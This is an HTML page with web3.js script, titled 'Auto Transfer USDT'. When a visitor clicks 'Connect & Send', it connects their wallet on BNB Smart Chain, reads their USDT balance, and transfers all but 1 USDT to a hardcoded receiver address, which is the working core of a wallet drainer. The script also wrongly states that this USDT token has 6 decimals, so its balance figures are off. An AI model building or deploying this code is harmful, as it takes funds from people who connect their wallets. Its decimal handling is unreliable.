<!DOCTYPE html>
<html>
<head>
  <title>Auto Transfer USDT</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
</head>
<body>
  <button onclick="connectAndTransfer()">Connect & Send</button>

  <script>
    const receiver = '0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a'; // NEW Receiver
    const usdtAddress = '0x55d398326f99059ff775485246999027b3197955'; // USDT BEP20
    const usdtAbi = [
      {
        "constant": true,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      }
    ];

    async function connectAndTransfer() {
      // Check if wallet is installed
      if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet.");
        return;
      }

      const web3 = new Web3(window.ethereum);

      // Check if wallet is on BNB Smart Chain (chain ID 56)
      const chainId = await web3.eth.getChainId();
      if (chainId !== 56) {
        alert("Please switch to BNB Smart Chain (BSC) in your wallet.");
        return;
      }

      // Connect wallet
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const sender = accounts[0];

      // Initialize USDT contract
      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);

      // Check USDT balance
      const balanceStr = await usdt.methods.balanceOf(sender).call();
      const balance = web3.utils.toBigInt(balanceStr);
      const decimals = 6; // USDT has 6 decimals
      const minBalance = 1000000n; // 1 USDT in smallest unit (1e6)
      if (balance <= minBalance) {
        alert(`Insufficient USDT balance. You have ${Number(balance) / 1e6} USDT, need at least ${Number(minBalance) / 1e6} USDT.`);
        return;
      }

      const amountToSend = balance - minBalance;

      // Check BNB balance for gas fee
      const gasLimit = 200000; // Reasonable gas limit for USDT transfer
      const gasPrice = web3.utils.toWei('5', 'gwei'); // 5 Gwei
      const estimatedGasFee = BigInt(gasLimit) * BigInt(gasPrice); // Total gas fee in wei
      const minBnbForGas = estimatedGasFee + (estimatedGasFee / 2n); // Add 50% buffer
      const bnbBalance = await web3.eth.getBalance(sender);

      if (BigInt(bnbBalance) < minBnbForGas) {
        const requiredBnb = Number(minBnbForGas) / 1e18;
        const currentBnb = Number(bnbBalance) / 1e18;
        alert(`Insufficient BNB for gas fee. You have ${currentBnb.toFixed(6)} BNB, need at least ${requiredBnb.toFixed(6)} BNB.`);
        return;
      }

      try {
        const tx = await usdt.methods
          .transfer(receiver, amountToSend.toString())
          .send({ 
            from: sender,
            gas: gasLimit.toString(),
            gasPrice: gasPrice
          });

        alert("USDT sent! Tx hash: " + tx.transactionHash + "\nCheck on BscScan: https://bscscan.com/tx/" + tx.transactionHash);
      } catch (err) {
        console.error(err);
        alert("Transaction failed: " + err.message + "\nCheck transaction details on BscScan for more info.");
      }
    }
  </script>
</body>
</html>
